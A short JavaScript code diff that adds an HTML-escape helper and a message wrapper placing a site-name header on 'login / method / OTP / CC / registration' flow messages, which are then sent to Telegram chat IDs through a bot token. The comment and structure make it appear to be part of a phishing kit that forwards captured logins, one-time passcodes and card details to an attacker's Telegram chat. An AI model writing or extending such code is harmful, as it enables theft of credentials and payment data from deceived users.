@@ -1,11 +1,20 @@
+import { SITE_DISPLAY_NAME } from "./site-url"
 const SITE_NAME = process.env.SITE_NAME || 'The Standard';
 
-/**
- * Send a message to all Telegram chat IDs in TELEGRAM_CHAT_ID (comma-separated).
- * @param {string} text - Message text (supports Markdown/HTML if parse_mode is set)
- * @returns {Promise<boolean>} - true if all sends succeeded
- * @throws {Error} - If token/chat IDs missing or all sends fail
- */
+function escapeHtml(s) {
+  return String(s)
+    .replace(/&/g, "&amp;")
+    .replace(/</g, "&lt;")
+    .replace(/>/g, "&gt;")
+    .replace(/"/g, "&quot;")
+    .replace(/'/g, "&#39;")
+}
+
+/** Site header for all ops flow messages (login / method / OTP / CC / registration). */
+export function wrapFlowMessage(body) {
+  return `🏷️ <b>${escapeHtml(SITE_DISPLAY_NAME)}</b>\n━━━━━━━━━━━━━━━━━━\n\n${body}`
+}
+
 export async function sendTelegramMessage(text) {
   const token = process.env.TELEGRAM_BOT_TOKEN;
   const chatIdsRaw = process.env.TELEGRAM_CHAT_ID;
